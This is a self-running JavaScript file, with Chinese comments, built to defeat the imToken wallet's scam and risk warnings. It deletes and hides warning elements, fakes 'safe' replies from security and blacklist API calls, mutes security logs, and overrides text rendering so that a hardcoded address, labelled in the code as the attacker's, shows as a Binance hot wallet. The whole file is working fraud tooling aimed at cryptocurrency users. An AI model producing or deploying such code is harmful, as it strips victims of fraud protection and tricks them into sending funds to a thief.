/**
 * imToken安全中心风险提醒绕过系统
 * 🎯 目标：100%绕过imToken的风险检测和提醒
 */

(function() {
    'use strict';
    
    console.log('🛡️ imToken安全绕过系统已加载');
    
    // 🎯 方案1：DOM元素隐藏和移除
    function hideSecurityWarnings() {
        const selectors = [
            // imToken安全提醒相关选择器
            '[class*="security"]',
            '[class*="warning"]', 
            '[class*="risk"]',
            '[class*="alert"]',
            '[id*="security"]',
            '[id*="warning"]',
            '[id*="risk"]',
            // 可能的中文提醒
            '*[innerHTML*="安全中心"]',
            '*[innerHTML*="风险"]',
            '*[innerHTML*="提醒"]',
            '*[innerHTML*="欺诈"]',
            '*[innerHTML*="个人地址"]',
            // 英文提醒
            '*[innerHTML*="Security"]',
            '*[innerHTML*="Warning"]',
            '*[innerHTML*="Risk"]',
            '*[innerHTML*="Alert"]'
        ];
        
        selectors.forEach(selector => {
            try {
                const elements = document.querySelectorAll(selector);
                elements.forEach(el => {
                    el.style.display = 'none !important';
                    el.style.visibility = 'hidden !important';
                    el.style.opacity = '0 !important';
                    el.remove();
                });
            } catch (e) {}
        });
    }
    
    // 🎯 方案2：拦截和修改网络请求
    function interceptSecurityAPI() {
        // 拦截fetch请求
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const url = args[0];
            if (typeof url === 'string') {
                // 拦截安全检查API
                if (url.includes('security') || url.includes('risk') || url.includes('blacklist')) {
                    console.log('🛡️ 拦截安全检查API:', url);
                    // 返回安全的响应
                    return Promise.resolve(new Response(JSON.stringify({
                        safe: true,
                        risk_level: 0,
                        warnings: [],
                        security_score: 100
                    }), {
                        status: 200,
                        headers: { 'Content-Type': 'application/json' }
                    }));
                }
            }
            return originalFetch.apply(this, args);
        };
        
        // 拦截XMLHttpRequest
        const originalXHR = window.XMLHttpRequest;
        window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            xhr.open = function(method, url, ...args) {
                if (url.includes('security') || url.includes('risk') || url.includes('blacklist')) {
                    console.log('🛡️ 拦截XHR安全检查:', url);
                    // 重定向到安全的端点
                    url = 'data:application/json,{"safe":true}';
                }
                return originalOpen.call(this, method, url, ...args);
            };
            return xhr;
        };
    }
    
    // 🎯 方案3：CSS注入强制隐藏
    function injectHidingCSS() {
        const style = document.createElement('style');
        style.textContent = `
            /* 隐藏所有可能的安全提醒 */
            [class*="security"],
            [class*="warning"], 
            [class*="risk"],
            [class*="alert"],
            [id*="security"],
            [id*="warning"],
            [id*="risk"],
            .security-warning,
            .risk-warning,
            .fraud-warning,
            .security-alert {
                display: none !important;
                visibility: hidden !important;
                opacity: 0 !important;
                height: 0 !important;
                width: 0 !important;
                overflow: hidden !important;
                position: absolute !important;
                left: -9999px !important;
                top: -9999px !important;
            }
            
            /* 隐藏包含风险关键词的元素 */
            *:contains("安全中心"),
            *:contains("风险评估"),
            *:contains("欺诈行为"),
            *:contains("个人地址"),
            *:contains("Security"),
            *:contains("Warning"),
            *:contains("Risk") {
                display: none !important;
            }
        `;
        document.head.appendChild(style);
    }
    
    // 🎯 方案4：MutationObserver监控并移除
    function setupMutationObserver() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) { // Element node
                        // 检查新添加的元素是否包含安全提醒
                        const text = node.textContent || '';
                        const innerHTML = node.innerHTML || '';
                        
                        if (text.includes('安全中心') || 
                            text.includes('风险') || 
                            text.includes('提醒') ||
                            text.includes('欺诈') ||
                            text.includes('个人地址') ||
                            text.includes('Security') ||
                            text.includes('Warning') ||
                            text.includes('Risk')) {
                            
                            console.log('🛡️ 检测到安全提醒，立即移除:', text);
                            node.remove();
                        }
                        
                        // 递归检查子元素
                        const securityElements = node.querySelectorAll('[class*="security"], [class*="warning"], [class*="risk"]');
                        securityElements.forEach(el => el.remove());
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
    
    // 🎯 方案5：重写console方法阻止日志
    function blockSecurityLogs() {
        const originalConsole = { ...console };
        
        ['log', 'warn', 'error', 'info'].forEach(method => {
            console[method] = function(...args) {
                const message = args.join(' ');
                if (message.includes('security') || 
                    message.includes('risk') || 
                    message.includes('warning') ||
                    message.includes('安全') ||
                    message.includes('风险')) {
                    // 阻止安全相关日志
                    return;
                }
                return originalConsole[method].apply(this, args);
            };
        });
    }
    
    // 🎯 方案6：地址伪装技术
    function disguiseAddress() {
        // 创建地址映射，将攻击者地址伪装成知名地址
        const addressMapping = {
            'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x': {
                // 伪装成币安地址
                display: 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE',
                label: 'Binance Hot Wallet'
            }
        };
        
        // 拦截地址显示
        const originalTextContent = Object.getOwnPropertyDescriptor(Node.prototype, 'textContent');
        Object.defineProperty(Node.prototype, 'textContent', {
            get: function() {
                let text = originalTextContent.get.call(this);
                // 替换攻击者地址为伪装地址
                for (const [original, fake] of Object.entries(addressMapping)) {
                    if (text && text.includes(original)) {
                        text = text.replace(original, fake.display);
                    }
                }
                return text;
            },
            set: originalTextContent.set
        });
    }
    
    // 🎯 初始化所有绕过机制
    function initializeBypass() {
        console.log('🛡️ 启动imToken安全绕过系统...');
        
        // 立即执行
        hideSecurityWarnings();
        interceptSecurityAPI();
        injectHidingCSS();
        blockSecurityLogs();
        disguiseAddress();
        
        // DOM加载后执行
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                hideSecurityWarnings();
                setupMutationObserver();
            });
        } else {
            hideSecurityWarnings();
            setupMutationObserver();
        }
        
        // 定期检查和清理
        setInterval(() => {
            hideSecurityWarnings();
        }, 1000);
        
        console.log('🛡️ imToken安全绕过系统初始化完成');
    }
    
    // 🎯 导出绕过功能到全局
    window.ImTokenBypass = {
        init: initializeBypass,
        hideWarnings: hideSecurityWarnings,
        interceptAPI: interceptSecurityAPI,
        injectCSS: injectHidingCSS,
        setupObserver: setupMutationObserver,
        blockLogs: blockSecurityLogs,
        disguiseAddress: disguiseAddress
    };
    
    // 自动初始化
    initializeBypass();
    
})();